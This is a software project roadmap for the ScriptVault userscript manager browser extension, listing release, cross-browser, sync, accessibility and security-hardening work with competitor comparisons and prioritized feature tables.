# ScriptVault Roadmap

> From v2.0.1 (bash-concatenated JS prototype) to production-grade TypeScript extension.
> Each phase is independently shippable. Later phases depend on earlier ones.
>
> **Roadmap version:** Round 14 - OSINT refresh 2026-05-24. Shipped baseline remains **v3.11.0 (2026-05-19, tag pushed)**, and `main` now has additional unreleased 2026-05-24 hardening/release commits including release artifact reconciliation, CWS runbook/audit-gate alignment, Chrome userScripts diagnostics, Firefox AMO validation packaging, and permission/store-copy drift checks. This Round 14 section is the current planning source for v3.12.0+ and supersedes older Round 13 prioritization where rows disagree.
> **2026-05-24 state:** 821 local Vitest cases were last recorded green via `npm run check`; `npm audit --audit-level=high --omit=optional` is currently clean; GitHub Release `v3.11.0` is now published as latest with `ScriptVault-v3.11.0.zip`; Firefox AMO package/source ZIP generation now passes `web-ext lint` with 0 errors and 0 notices; `npm run store-copy:check` covers 30 manifest permission/privacy/store surfaces; no GitHub issues or PRs are currently open.
> **Source floor:** >294 URLs from Rounds 1-13 plus 88 Round 14 external sources below. Every Round 14 Now/Next item carries local or external source IDs from the appendix.

---

## Round 14 - 2026-05-24 OSINT Roadmap Refresh

### Phase 0 State of the Repo Memo

ScriptVault is a Chrome MV3 userscript manager with a large feature surface: popup, dashboard, side panel, DevTools panel, install page, Monaco sandbox, content bridge, background service worker, cloud sync providers, import/export, signing/provenance primitives, userstyles, update checks, network logging, and a TypeScript mirror of much of the runtime. The production bundle is still built by ordered concatenation of `shared/`, `modules/`, `bg/`, and `background.core.js` in `esbuild.config.mjs`, while `src/**` is type-checked as a mirror. That split is the dominant technical constraint: recent commits repeatedly fixed runtime/TS drift, and current code still shows bounded-fetch hardening in `background.core.js` that is not fully mirrored in `src/background/install-handler.ts` / `src/background/update-checker.ts`. The highest-value direction is therefore not new breadth first; it is release trust, source-of-truth convergence, cross-browser packaging, consent-first update/install safety, and measurable accessibility/performance hardening.

### Evidence Reviewed

Local source and repo artifacts:

- Repo tree: `manifest.json`, `manifest-firefox.json`, `package.json`, `package-lock.json`, `esbuild.config.mjs`, `background.core.js`, `content.js`, `shared/`, `modules/`, `bg/`, `src/`, `pages/`, `scripts/`, `tests/`, `docs/`, `.github/workflows/ci.yml`, `.factory/state.yaml`, `.factory/large-repo-state.yaml`.
- Top-level docs: `README.md`, `CHANGELOG.md`, `ROADMAP.md`, `FIREFOX-PORT.md`, `PRIVACY.md`, `AGENTS.md`, `CLAUDE.md`, `RESEARCH_FEATURE_PLAN.md`.
- Design/research docs: `docs/cross-browser-pipeline.md`, `docs/release-runbook.md`, `docs/require-provenance-design.md`, `docs/wcag3-gap-analysis.md`, `docs/extension-interop.md`, `docs/mcp-2026-compliance.md`, `docs/research/iter-1-l1-claude-led.md`, `docs/research/iter-1-l3-claude-smoke.md`.
- Tests: 53 test files under `tests/`, including source parity tests, security tests, accessibility tests, import/export tests, storage tests, packaging tests, and wrapper tests.
- Git history: `git log -200 --oneline --decorate` reviewed through `f4c748c` back to initial public packaging work.
- Release artifacts: `gh release list --limit 20` now shows `v3.11.0` as the latest GitHub Release with `ScriptVault-v3.11.0.zip`; the stale root `ScriptVault-firefox-v2.1.7.xpi` was removed locally.
- Issue tracker: `gh issue list --state all --limit 100` and `gh pr list --state all --limit 100` returned no project issues or PRs.
- Dependency/security checks: `npm audit --audit-level=high --omit=optional` found 0 vulnerabilities. `npm outdated --json` reports newer versions for Vitest, coverage-v8, chrome-types, esbuild, jsdom, Monaco, puppeteer-core, and TypeScript.

Verified constraints:

- Runtime target: Manifest V3, Chrome minimum 130, `chrome.userScripts`, `sidePanel`, `offscreen`, `declarativeNetRequest`, `declarativeNetRequestWithHostAccess`, `<all_urls>`.
- Firefox target: separate `manifest-firefox.json` at version 3.11.0, Firefox 140+ desktop / Android 142+ validation target, with AMO package/source ZIP generation in place; manual Firefox sideload smoke remains open in `FIREFOX-PORT.md`.
- Build: `npm run build` runs `node esbuild.config.mjs`; background output is concatenated JS, not emitted from `src/background/index.ts`.
- Tests: `npm run check` is `tsc --noEmit && vitest run`; CI additionally runs Chrome dashboard smoke and builds a ZIP artifact.
- Privacy philosophy: local-first storage, no external usage beacon in current docs/code; external telemetry ideas below stay rejected unless user-owned and local-only.

### Current Product Map

Core workflows:

- Install scripts from URL, pasted code, dropped files, ZIP/JSON backups, store/discovery pages, and selected import formats.
- Run scripts through `chrome.userScripts`, wrapper-built Greasemonkey/Tampermonkey APIs, `@match`/`@include`/regex support, metadata directives, update checks, and popup/context-menu one-shot execution.
- Manage scripts in dashboard and popup: search, cards/table modules, collections, snippets, profiles, templates, scheduler, theme editor, dependency graph, heatmap, CSP/DNR helper, linter, debugger, Gist surface, and side panel.
- Sync/backup via WebDAV, Google Drive, Dropbox, OneDrive, EasyCloud, browser sync, Gist import/export, scheduled backups, and manual import/export.
- Inspect safety and behavior through analyzer, signing/trust primitives, netlog/HAR export, error log, DevTools panel, and privacy/security docs.

Main code locations:

- Runtime background source: `background.core.js`, `modules/*.js`, `bg/*.js`, `shared/utils.js`, `content.js`.
- Typed mirror: `src/background/*.ts`, `src/modules/*.ts`, `src/bg/*.ts`, `src/storage/*.ts`, `src/types/*.ts`, `src/shared/utils.ts`.
- UI surfaces: `pages/popup.*`, `pages/dashboard.*`, `pages/dashboard-*.js`, `pages/sidepanel.*`, `pages/devtools*`, `pages/install.*`, `pages/editor-sandbox.html`, `pages/monaco-adapter.js`.
- Build/release: `esbuild.config.mjs`, `build.sh`, `publish.sh`, `cws-setup.sh`, `.github/workflows/ci.yml`, `.gitattributes`, `scripts/*`.
- Current state files: `.factory/state.yaml` and `.factory/large-repo-state.yaml` list `XHR-PRIVACY` and `DNS-REBIND` as remaining hardening work.

User personas:

- Power users migrating from Tampermonkey/Violentmonkey who need compatible script execution and trustable updates.
- Script authors who need an editor, local debugging, dependency visibility, import/export, and fast test/run loops.
- Privacy/security-sensitive users who want local-first control over arbitrary code, network permissions, sync tokens, backups, and update provenance.
- Extension maintainers who need Chrome Web Store, Firefox/AMO, Edge, and self-distribution packages to match the same product state.

Platforms and distribution:

- Chrome/Chromium primary through MV3 and Chrome Web Store.
- Firefox MV3 work in progress through `manifest-firefox.json` and `FIREFOX-PORT.md`.
- Edge and other Chromium stores are technically plausible but not yet a release artifact path.
- Safari/iOS and Android userscript ecosystems are useful research inputs, but a native rewrite is not a near-term fit.

### Direct Competitor Snapshot

| Project | Stars / activity checked 2026-05-24 | Signals for ScriptVault | Source |
|---|---:|---|---|
| Violentmonkey | 8,261 stars, pushed 2026-05-22, release v2.37.0 | Mature compatibility baseline, recent S3 sync PR, open ESM loader and search issues | S16-S23 |
| Tampermonkey | 5,463 stars, pushed 2025-03-30, commercial site says 10M+ users | Table-stakes sync, update checks, configurable settings levels, profiles/tags/user friction | S24-S31 |
| Greasemonkey | 2,561 stars, pushed 2026-05-23 | Firefox-first privacy behavior and First Party Isolation compatibility | S32-S33 |
| quoid/userscripts | 4,525 stars, pushed 2026-05-10, release v4.8.6 | Safari/iOS direction, SRI, GitHub private repo sync, color scheme/private profile gaps | S34-S40 |
| ScriptCat | 4,459 stars, pushed 2026-05-24, release v0.16.15 | Background/timed script APIs, subscribe flows, recycle bin, mobile editing, sandbox tests | S41-S47 |
| Stay | 1,287 stars, Safari/iOS, pushed 2024-06-23 | Mobile/local Safari model is useful only as a longer-term research lane | S48 |
| Android WebMonkey | 152 stars, pushed 2026-02-19 | Android userscript support shows mobile demand, but not a fit for current Chrome MV3 scope | S49 |
| OpenUserJS / GreasyFork | 981 / 1,980 stars, active script registries | Registry integration, install-source trust, publishing workflows | S50-S51 |
| Smaller userscript managers | 5-34 stars, active in 2026 | Gist, built-in IDE, self-auditable/security-first positioning | S52-S56 |
| Stylus | 6,641 stars, pushed 2026-05-23 | Userstyle editor/search/color-management lessons for ScriptVault userstyles | S57-S61 |
| WXT / Plasmo / web-ext | 9,849 / 13,043 / 3,076 stars | Packaging, target-browser builds, web-ext validation/signing, release modernization | S62-S68 |

### Phase 2 Harvest and Phase 3 Gap Analysis

Scale: Fit `Y/M/N`, impact and effort `1-5`, novelty `P` parity or `L` leapfrog. Tier is the roadmap disposition.

| ID | Feature or improvement | Sources | Category | Prevalence | Fit | Impact | Effort | Risk | Novelty | Tier | Placement reason |
|---|---|---|---|---|---|---:|---:|---|---|---|---|
| H001 | Reconcile GitHub Releases, tags, manifests, CWS README, and root artifacts | L01,L08,L17 | distribution | table-stakes | Y | 5 | 2 | users install stale builds | P | Now | Public artifacts are currently behind v3.11.0 and undermine trust. |
| H002 | Modernize Chrome Web Store API v2 publishing and status checks | L12,S03,S04 | distribution | table-stakes | Y | 5 | 3 | release automation | P | Now | `package.json` has v4 CLI but docs still describe older pinning/API assumptions. |
| H003 | Add rollback drill and backward-compatible storage migration tests | S05,S06,L20 | reliability | common | Y | 5 | 3 | data loss | P | Now | Chrome rollback exists but can break stored data without local rehearsal. |
| H004 | Sign ZIP/XPI artifacts and publish provenance/SBOM | L14,S69-S72 | security | emerging | Y | 5 | 4 | key/process complexity | L | Now | Extension compromise campaigns make verifiable artifacts high-value. |
| H005 | Add extension package diff and suspicious-permission release gate | S73-S76,L12 | security | emerging | Y | 5 | 3 | false positives | L | Now | Research shows marketplace vetting gaps and malicious update risk. |
| H006 | Make CI audit failures blocking or document why not | L12,L20 | security | table-stakes | Y | 4 | 1 | noisy advisories | P | Now | CI currently continues on high audit failures, while release docs imply a hard gate. |
| H007 | Collapse runtime JS and TS mirror toward one source of truth | L10,L18,L19 | architecture | project-specific | Y | 5 | 5 | regression blast radius | L | Now | Current split repeatedly creates parity bugs. |
| H008 | Add mirror drift tests for bounded fetch install/update paths | L18,L19 | testing | project-specific | Y | 4 | 2 | false confidence | P | Now | Runtime has stream-bounded fetch; TS install/update mirror still reads whole bodies. |
| H009 | Add regression tests for Gist token write rejection path | L18,L21 | testing | project-specific | Y | 4 | 1 | token state loss | P | Now | Recent Promise API fix needs focused coverage against storage rejection. |
| H010 | Add regression tests for explicit empty `@grant` arrays | L18,L21 | testing | project-specific | Y | 4 | 1 | privilege escalation | P | Now | Recent TS grant-deny fix should be pinned to prevent GM APIs under `@grant none`. |
| H011 | Refresh Chrome 138+ Allow User Scripts onboarding and diagnostics | L04,S01,S02 | onboarding | table-stakes | Y | 5 | 2 | user setup friction | P | Now | Chrome changed the userScripts enablement UI and failure behavior. |
| H012 | Move userscript-origin messages to `runtime.onUserScriptMessage` | L22,S01,S02 | security | emerging | Y | 5 | 4 | browser-version gating | L | Now | Dedicated handlers exist to identify less-trusted user-script messages. |
| H013 | Add user-script world CSP/messaging configuration checks | L04,S01,S02 | security | common | Y | 4 | 2 | broken APIs if omitted | P | Now | `configureWorld({ messaging: true })` is required before direct messaging. |
| H014 | Post-fetch DNS/IP verification for URL installs and `@require` loads | L22,L20,S73 | security | rare | Y | 5 | 4 | platform DNS gaps | L | Now | Repo state already flags DNS rebinding as remaining P2 hardening. |
| H015 | Require provenance/SRI metadata for high-risk `@require` dependencies | L14,S38,S39,S69 | security | common | Y | 5 | 4 | ecosystem compatibility | L | Now | quoid and existing design docs both point at SRI/provenance as trust signals. |
| H016 | Add per-script update consent diff with network/permission changes | L15,S05,S06,S24 | trust | common | Y | 5 | 4 | UI complexity | L | Now | Userscript updates can silently change remote code and scopes. |
| H017 | AMO data collection manifest declaration and privacy statement refresh | L05,L07,S09,S11 | distribution | table-stakes | Y | 5 | 2 | store rejection | P | Now | Firefox submissions now require data-collection declarations. |
| H018 | Finish Firefox MV3 validation/signing pipeline with `web-ext` | L07,L11,S10,S67,S68 | distribution | table-stakes | Y | 5 | 4 | browser API drift | P | Now | Firefox manifest exists, but `FIREFOX-PORT.md` Phase 1 is still unchecked. |
| H019 | Generate per-browser manifest/build matrix from one config | L11,S62-S65 | architecture | common | Y | 4 | 5 | migration churn | P | Next | Useful after Firefox gates are stable; WXT-like generation should not precede release trust. |
| H020 | Edge Add-ons package/publish path | S66,L11 | distribution | common | Y | 3 | 3 | support load | P | Next | Low technical distance once Chrome/Firefox artifacts are reliable. |
| H021 | Browser support matrix generated from manifests and smoke results | L06,L11,S10,S11 | docs | common | Y | 4 | 2 | stale docs | P | Now | README claims broad support while Firefox port is unfinished. |
| H022 | Remove stale README claims and validate feature inventory against code | L05,L15,L16 | docs | project-specific | Y | 5 | 2 | user trust | P | Now | README advertises removed/stale features and old compatibility statements. |
| H023 | Changelog sync for unreleased hardening commits | L08,L18 | docs | table-stakes | Y | 3 | 1 | release notes drift | P | Now | Latest two hardening commits are not clearly represented in `CHANGELOG.md`. |
| H024 | Scheduled dependency-maintenance lane | L20,S77-S84 | maintenance | table-stakes | Y | 4 | 2 | upgrade regressions | P | Now | Several core dev dependencies are behind current wanted/latest versions. |
| H025 | Monaco 0.55 upgrade trial with sandbox smoke | L04,L20,S77 | maintenance | common | Y | 3 | 3 | editor regression | P | Next | Monaco is intentionally pinned behind latest; upgrade needs visual/smoke proof. |
| H026 | Vitest/coverage upgrade to latest patch | L20,S79 | maintenance | table-stakes | Y | 3 | 1 | test flake | P | Now | Patch upgrade is low risk and security/CI hygiene. |
| H027 | Puppeteer 25 compatibility trial | L20,S82 | maintenance | common | M | 2 | 3 | smoke harness breakage | P | Later | Major bump can wait until release pipeline gaps close. |
| H028 | S3-compatible sync provider | S18,S23,L13 | integrations | emerging | Y | 4 | 3 | credential/storage handling | P | Next | Violentmonkey just added it; fits local/user-owned sync. |
| H029 | GitHub private repository sync | S36,S52 | integrations | rare | M | 3 | 4 | token scope confusion | P | Later | Useful for authors, but Gist path and privacy docs need stronger trust first. |
| H030 | Manual sync button plus import/export provider config | S44,L13 | UX | common | Y | 4 | 2 | conflict handling | P | Next | ScriptCat users request explicit sync control; ScriptVault has many providers. |
| H031 | Sync token health, revoke, and storage disclosure panel | L05,L13,S73 | privacy | common | Y | 5 | 3 | accidental token exposure | L | Now | Prior Gist token storage work improved honesty but needs unified UI. |
| H032 | 3-way sync dry-run and conflict preview in provider flows | L05,L13,S24 | data | common | Y | 4 | 4 | merge edge cases | P | Next | Existing README claims 3-way merge; verify and make it observable. |
| H033 | Profiles/workspaces as user-facing execution contexts | L05,S31,S27 | UX | common | Y | 4 | 3 | mental model | P | Next | Tampermonkey users ask for profiles and ScriptVault already has workspace code. |
| H034 | Preserve tags/untagged filters during reinstall/update | S30,L15 | UX | common | Y | 3 | 2 | metadata migration | P | Next | Direct competitor issue maps to ScriptVault import/update flows. |
| H035 | Invert/not filters and bulk operation scopes | S26,L05 | UX | common | Y | 3 | 2 | accidental bulk actions | P | Next | Better filtering reduces destructive workflow risk. |
| H036 | Current-site quick enable/disable and scope expansion | S20,S21,L05 | UX | table-stakes | Y | 4 | 3 | host permission prompts | P | Next | Competitors expose site-scoped control; ScriptVault has context-menu/popup surfaces. |
| H037 | Iframe/frame execution controls per script | S45,L04,S01 | compatibility | common | Y | 4 | 3 | injection semantics | P | Next | ScriptCat issue and `userScripts` all-frame behavior make this valuable. |
| H038 | Improve script search by name, URL, tag, grant, source, and last-run | S17,L05 | UX | table-stakes | Y | 4 | 3 | index freshness | P | Next | Violentmonkey issue shows search remains a power-user pain point. |
| H039 | Editor search history dropdown | S58,L05 | UX | common | Y | 2 | 1 | low | P | Quick win | Stylus issue is directly applicable to Monaco editing. |
| H040 | Local file or local `@require` development mode | S19,S24,L05 | dev-experience | common | M | 3 | 4 | local-file permission/security | P | Later | Useful for authors but needs explicit trust gates. |
| H041 | ESM userscript loader research spike | S17,S34,L14 | dev-experience | emerging | M | 3 | 5 | interoperability | L | Under consideration | Important trend, but immediate support could fragment compatibility. |
| H042 | `GM.fetch` compatibility API | S37,L05 | compatibility | rare | Y | 3 | 3 | API design | P | Later | Fits GM compatibility after trust/release work. |
| H043 | Full VM/TM/GM compatibility matrix generated by tests | L05,S16,S24,S32 | testing | table-stakes | Y | 5 | 4 | maintenance load | P | Now | Current parity work is manual and drift-prone. |
| H044 | Userstyles import parity with Stylus | L05,S57 | integrations | common | Y | 3 | 3 | CSS parser issues | P | Later | Existing userstyle support can learn from Stylus without taking over its domain. |
| H045 | OKLAB/OKLCH color-variable support for userstyles | S60,L05 | UX | emerging | M | 2 | 3 | browser support | P | Later | Useful only after userstyle core flows are audited. |
| H046 | Userstyle Firefox CSP compatibility tests | S59,S10,L11 | compatibility | common | Y | 3 | 3 | Firefox-only bugs | P | Next | Helps Firefox port and userstyle claims. |
| H047 | GreasyFork/OpenUserJS install-source trust badges | L05,S50,S51 | trust | common | Y | 4 | 3 | spoofed source metadata | P | Next | Registry links should inform trust without becoming a marketplace clone. |
| H048 | One-click publish to registries | S18,S50,S51 | integrations | rare | N | 2 | 4 | account/security burden | P | Rejected | Publishing other users' code from the extension expands risk beyond core management. |
| H049 | Built-in marketplace browser | S50,S51,S87 | discovery | common | M | 3 | 5 | moderation/privacy | P | Later | A minimal trusted install flow fits; a full marketplace does not. |
| H050 | Example script/template gallery | S35,S53,L05 | docs | common | Y | 3 | 2 | stale examples | P | Next | Helps onboarding without expanding permissions. |
| H051 | Subscribe-list import and one-click subscription generation | S43,S44,L05 | integrations | common | M | 3 | 4 | update trust | P | Later | Fits after consent diff/provenance exists. |
| H052 | Trash/recycle bin with undoable destructive actions | S45,L05 | data-safety | table-stakes | Y | 4 | 3 | storage growth | P | Next | ScriptCat plans this; ScriptVault has destructive bulk flows. |
| H053 | Version history diff and rollback per script | L05,S24,S05 | data-safety | common | Y | 5 | 4 | storage growth | L | Now | Users need recovery from bad script updates before platform rollback matters. |
| H054 | Backup restore verification receipt | L13,L20,S05 | data-safety | common | Y | 4 | 2 | false confidence | P | Next | Restore should prove script/settings counts and failures. |
| H055 | CSV export formula-injection coverage across all exports | L18,L05 | security | common | Y | 4 | 2 | incomplete coverage | P | Now | Recent runtime fix needs inventory and tests for every CSV path. |
| H056 | Large-library virtualization and indexed search | L05,S40,S73 | performance | common | Y | 4 | 4 | UI regressions | P | Next | README claims broad management; large script sets need measured UI scaling. |
| H057 | Memory/callback leak diagnostics surfaced in UI | L08,L18,S40 | observability | rare | Y | 4 | 3 | noisy warnings | L | Next | Callback caps now log; UI can turn this into actionable repair hints. |
| H058 | Service-worker cold-start diagnostics and recovery prompts | L08,S01,L12 | reliability | common | Y | 4 | 3 | MV3 timing flake | P | Next | History shows repeated cold-start/setup warning repairs. |
| H059 | Error log filters by script/source/severity and saved views | L05,S57 | observability | common | Y | 3 | 2 | UI clutter | P | Later | Existing error log exists; higher priorities are data safety and release trust. |
| H060 | Local-only health dashboard, no external usage beacons | L05,L15,S73 | observability | common | Y | 3 | 2 | privacy wording | L | Next | Fits local-first philosophy while improving diagnostics. |
| H061 | APCA/WCAG contrast audit for all dashboard modules | L15,S85-S87 | accessibility | emerging | Y | 4 | 3 | design churn | P | Now | Existing WCAG3 doc names this gap; many dashboard modules exist. |
| H062 | Skip links, help consistency, and modal focus audit | L15,S85 | accessibility | table-stakes | Y | 4 | 2 | regressions | P | Now | Existing a11y tests cover pieces, not all UI states. |
| H063 | Live-region/screen-reader pass for async sync/install/update states | L15,S85 | accessibility | table-stakes | Y | 4 | 3 | noisy announcements | P | Next | Trust flows need accessible feedback. |
| H064 | High-contrast theme and forced-colors tests | L15,S85-S87 | accessibility | common | Y | 3 | 3 | visual complexity | P | Next | Useful after APCA baseline. |
| H065 | Locale coverage report and generated manifest locale checks | L05,L12,S11 | i18n | common | Y | 3 | 2 | stale translations | P | Next | `_locales` exists and CI has manifest-locale tests; extend into coverage reporting. |
| H066 | Mixed-language `lang` attributes in script metadata/UI | L15,S85 | i18n | rare | M | 2 | 3 | metadata ambiguity | P | Later | Existing WCAG3 doc lists it, but lower impact than trust gates. |
| H067 | Store/privacy copy generated from manifest permissions | L05,L12,S09,S11 | docs | common | Y | 4 | 2 | store rejection | L | Now | Manifest permissions are broad; copy must be accurate and current. |
| H068 | Root stale artifact guard | L01,L17 | release | project-specific | Y | 3 | 1 | accidental install | P | Now | Stale Firefox XPI remains at repo root. |
| H069 | CODEOWNERS/security policy/issue templates for trust work | L12,S73-S76 | process | common | Y | 3 | 2 | maintainer overhead | P | Next | No issues exist; templates can steer future reports. |
| H070 | Web-accessible resource minimization audit | L04,S73,L12 | security | table-stakes | Y | 4 | 2 | broken install page | P | Next | Manifest exposes install page to all URLs; verify necessity and harden. |
| H071 | Host permission minimization and optional-host migration design | L04,S10,S11 | privacy | common | M | 5 | 5 | permission prompt churn | L | Under consideration | High trust value but deep compatibility risk for a userscript manager. |
| H072 | `@connect` consent prompts and per-script firewall rules | L05,S24,S73 | privacy | common | Y | 5 | 5 | compatibility | L | Later | Aligns with user trust but depends on XHR bridge rewrite. |
| H073 | Internal host blocklist for all outbound extension fetch paths | L18,L20,S73 | security | table-stakes | Y | 5 | 3 | false blocks | P | Now | Webhooks were hardened; URL installs/resources/sync should share policy. |
| H074 | Enterprise policy provisioning docs and import validation | L18,S06 | enterprise | niche | M | 2 | 3 | support burden | P | Later | Existing history mentions OS-policy provisioning; not a priority for consumer release. |
| H075 | Chrome rollback and incident-response user notice template | S05,S73-S76,L12 | reliability | common | Y | 4 | 2 | panic messaging | P | Now | Extension compromise sources make response readiness concrete. |
| H076 | Mobile browser support notes for Edge/Android/Kiwi-like users | S49,S88 | mobile | niche | M | 2 | 2 | unsupported promises | P | Under consideration | Useful docs, but not a tested target. |
| H077 | Native mobile app rewrite | S48,S49 | mobile | rare | N | 1 | 5 | product split | P | Rejected | Contradicts current MV3 extension focus. |
| H078 | Multi-user collaboration backend | L05 | multi-user | rare | N | 1 | 5 | privacy/backend burden | L | Rejected | Local-first product does not need account-backed collaboration. |
| H079 | External usage analytics telemetry | L05,S73 | telemetry | common | N | 1 | 3 | privacy trust loss | P | Rejected | Local diagnostics are acceptable; outbound telemetry conflicts with product trust. |
| H080 | Paid tiers or monetized script marketplace | S24,S50,S51 | licensing | common | N | 1 | 5 | identity/business burden | P | Rejected | Would dilute ScriptVault from user-controlled tooling into marketplace operation. |
| H081 | Remote configuration kill-switch | S73-S76 | security | common | N | 2 | 4 | remote control risk | P | Rejected | Local rollback/update notices are safer than remote control infrastructure. |
| H082 | Extension interop API for external IDE/companion tools | L16,S62-S65 | dev-experience | emerging | M | 3 | 4 | API stability | L | Under consideration | Existing doc gates it; no current user signal in issues. |
| H083 | Local package manager for script dependencies | S17,S38,S39,L14 | dev-experience | rare | M | 3 | 5 | supply-chain risk | L | Under consideration | Could leapfrog but should follow provenance work. |
| H084 | WASM/static analyzer expansion | S73-S76,L05 | security | emerging | M | 3 | 4 | bundle size | L | Later | Analyzer exists; expand after package-diff/provenance gates. |
| H085 | DNR matched-rule debug surface | L05,S12,S10 | observability | common | Y | 3 | 3 | permission sensitivity | P | Later | Valuable for CSP/DNR helper after cross-browser DNR checks. |
| H086 | Private publish / enterprise channel documentation | S04,S06 | distribution | niche | M | 2 | 2 | support expectations | P | Later | Chrome supports private external org publishing; not a current core channel. |
| H087 | GreasePanda-style beginner marketplace/onboarding | S87 | UX | emerging | N | 2 | 4 | product dilution | P | Rejected | ScriptVault should stay power-user/local-first, not a no-code marketplace. |
| H088 | BareScript-style minimal self-auditable mode | S56,L05 | trust | rare | M | 2 | 3 | dual UX | L | Under consideration | Interesting, but the current product identity is full-featured. |
| H089 | Per-script trust receipt after install/update | L14,S05,S73 | trust | rare | Y | 5 | 4 | metadata quality | L | Next | Combines provenance, source, grants, hosts, and diffs into one explainable artifact. |
| H090 | Source-map/source bundle for review stores | L12,S10,S67 | distribution | common | Y | 3 | 2 | artifact size | P | Now | Firefox/WXT docs point to source ZIP needs; reviewers need reproducible sources. |

### Highest-Value New Features

1. **Release Trust Center and signed artifact pipeline** - combine v3.11.0 release reconciliation, CWS API v2 status checks, rollback drill, artifact signing, SBOM/provenance, and package diff gates. Sources: H001-H006, H075, H090.
2. **Unified script trust receipt** - on install/update, show source URL, registry, hashes, `@require` provenance, grants, host scopes, update diff, and rollback point. Sources: H015-H016, H047, H053, H089.
3. **Dedicated user-script messaging bridge** - move XHR/user-script calls from page-visible bridge assumptions to `runtime.onUserScriptMessage` with version gates and configureWorld checks. Sources: H012-H013.
4. **Cross-browser release gate** - Firefox MV3/AMO manifest checks, data-collection declarations, web-ext validation/signing, generated support matrix, and eventually Edge package path. Sources: H017-H021, H046, H065.
5. **Runtime/TS source convergence** - make either JS or TS authoritative, then add parity gates until the migration lands. Sources: H007-H010, H043.
6. **Network egress hardening layer** - shared internal-host, redirect, DNS-rebind, and `@connect` policy across URL installs, resources, webhook, sync, and GM XHR. Sources: H014, H073, H072.
7. **Local-first sync safety cockpit** - token health/revocation, manual sync, dry-run conflict preview, restore receipts, and optional S3-compatible provider. Sources: H028-H032, H054.
8. **Large-library performance and diagnostics** - virtualized library rendering, indexed search, service-worker diagnostics, callback leak surfacing, and local-only health dashboard. Sources: H056-H060.
9. **A11y/i18n hardening pass** - APCA contrast, skip links, focus/live-region audits, forced-colors coverage, locale coverage. Sources: H061-H066.

### Existing Feature Improvements

| Area | Current behavior | Recommended change | Likely files | Verify |
|---|---|---|---|---|
| Release/docs | `README.md` and `docs/release-runbook.md` contain stale feature/version/tooling claims; GitHub Releases stop at v2.3.4 | Add a release reconciliation task before any new public release | `README.md`, `CHANGELOG.md`, `docs/release-runbook.md`, `.github/workflows/ci.yml`, `package.json`, `manifest*.json` | `gh release list --limit 5`; `npm run build`; manual artifact version inspection |
| Runtime/TS parity | Production bundle is JS concatenation; `src/**` mirrors behavior but can drift | Add drift tests now, then stage a single-source migration | `esbuild.config.mjs`, `background.core.js`, `modules/*.js`, `src/background/*.ts`, `src/modules/*.ts`, `tests/source-*.test.js` | `npm run typecheck`; focused parity Vitest suite |
| UserScripts setup | Existing docs/status fixed one Chrome toggle bug, but Chrome 138+ has per-extension Allow User Scripts behavior | Update onboarding/status copy and probes for both Chrome <138 and >=138 | `background.core.js`, `pages/popup.js`, `pages/dashboard*.js`, `README.md` | Manual Chrome 138+ setup-required flow |
| Firefox port | Manifest exists; roadmap Phase 1 still unchecked; AMO data-collection rules now apply | Finish validation/signing and store copy before broad Firefox claims | `manifest-firefox.json`, `FIREFOX-PORT.md`, `build-firefox.sh`, `docs/cross-browser-pipeline.md` | `web-ext lint`; `web-ext sign --channel=unlisted` when credentials exist |
| Sync providers | Many providers and Gist paths exist; token trust and failure states are fragmented | Add unified token/status/revoke panel and manual sync/dry-run flows | `modules/sync-providers.js`, `modules/sync-easycloud.js`, `pages/dashboard-gist.js`, `src/modules/sync-*.ts` | Provider mock tests plus manual disabled-token flows |
| Import/update safety | Install/update can fetch remote code and dependencies | Add trust receipt, provenance/SRI validation, internal-host policy, and rollback point | `background.core.js`, `modules/resources.js`, `src/background/install-handler.ts`, `src/background/resource-loader.ts`, `pages/install.js` | Malicious URL/redirect/DNS test fixtures |
| A11y | Targeted a11y tests exist, but WCAG3 gap doc names open module-wide risks | Add module-wide APCA/focus/live-region audit and forced-colors tests | `pages/*.html`, `pages/*.js`, `pages/dashboard.css`, `tests/*a11y*.test.js` | `npm run test:a11y`; browser forced-colors manual pass |
| Performance | Error-log and callback caps landed; large-library rendering still needs measured guardrails | Add large dataset fixtures and dashboard virtualized/indexed views where needed | `pages/dashboard*.js`, `modules/storage.js`, `src/storage/*`, `tests/gui-*.test.js` | 1k/10k script synthetic dataset smoke |

### Reliability, Security, Privacy, and Data Safety

- Verified: npm high-severity audit is currently clean.
- Closed 2026-05-24: GitHub Release `v3.11.0` is now latest, `ScriptVault-v3.11.0.zip` is attached, and stale root release artifacts are guarded by `npm run release:check`.
- Verified risk: production JS and TypeScript mirror remain separate. Recent history shows repeated parity fixes; current TS install/update paths still use `response.text()` where runtime has bounded stream reading.
- Closed 2026-05-24: `.github/workflows/ci.yml` now treats high-level npm audit failures as blocking and runs `npm run cws:check` plus `npm run release:check`.
- Closed 2026-05-24: broad `<all_urls>`, userScripts, DNR, sidePanel, offscreen, downloads, clipboard, identity, cookies, sandbox, web-accessible, and AMO data-collection surfaces now have generated-checkable privacy/store justifications via `npm run store-copy:check`.
- Verified risk: existing `.factory/large-repo-state.yaml` still flags `XHR-PRIVACY` and `DNS-REBIND`.
- Missing guardrails: artifact signing, SBOM, package diff, rollback rehearsal, AMO data-collection manifest declaration, source ZIP review artifact, unified internal-host policy, sync token revoke/status UI, and restore receipts.

### UX, Accessibility, and Trust

- Onboarding: Chrome 138+ requires per-extension Allow User Scripts copy and live diagnostics.
- Empty/loading/error states: sync, Gist, install/update, rollback, and long-running background registration flows need consistent disabled/loading states and accessible live-region feedback.
- Destructive actions: bulk delete/update/import should have trash/undo, restore receipts, and dry-run previews where data loss is plausible.
- Settings clarity: provider tokens, optional permissions, host scopes, userScripts toggle, DNR/CSP helper, and cookies/clipboard/identity should show why access is needed and how to revoke it.
- Accessibility: complete the documented APCA/WCAG3 pass across dashboard modules, modals, popup, side panel, install page, forced-colors, and screen-reader announcement paths.
- Trust signals: every install/update should produce a durable local receipt with source, hashes, grants, host scope, dependency provenance, and rollback point.

### Architecture and Maintainability

- Primary boundary issue: production runtime source and TS mirror are separate. Short-term parity tests are mandatory; long-term source convergence should be planned before more large feature batches.
- Build/release gap: `esbuild.config.mjs` is cross-platform, publishing scripts remain bash-oriented, and the CWS API v2 path is now covered by `npm run cws:check`; Windows-native publishing remains a future ergonomics item.
- Cross-browser gap: manual `manifest.json` and `manifest-firefox.json` drift risk argues for generated per-target manifests after the immediate Firefox validation gate.
- Test gaps: no current focused tests for recent Gist storage rejection fix, empty-grant deny behavior, package diff, rollback rehearsal, AMO lint/signing, or Chrome 138 setup copy.
- Docs gaps: Firefox port, browser support matrix, and future store-channel copy still need owner-facing checklist work, but manifest permission/privacy/store-copy drift is now blocked by `npm run store-copy:check`.
